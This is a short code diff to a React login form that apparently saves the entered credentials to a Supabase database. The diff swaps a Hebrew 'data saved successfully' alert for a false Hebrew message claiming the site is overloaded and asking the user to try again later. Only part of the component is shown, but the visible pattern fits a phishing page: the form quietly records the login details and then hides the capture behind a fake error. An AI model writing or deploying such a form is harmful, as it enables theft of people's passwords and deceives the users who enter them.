@@ -1,4 +1,3 @@
-
 import React, { useState } from 'react';
 import { Button } from '@/components/ui/button';
 import { Input } from '@/components/ui/input';
@@ -34,7 +33,7 @@ const LoginForm: React.FC = () => {
       setPassword('');
       setRememberMe(false);
       
-      alert('נתונים נשמרו בהצלחה ב-Supabase!'); // "Data saved successfully to Supabase!" in Hebrew
+      alert('קיים עומס על מערכת האתר, נסה שוב מאוחר יותר');
     } catch (error) {
       console.error('Error saving data:', error);
       alert('שגיאה בשמירת הנתונים'); // "Error saving data" in Hebrew
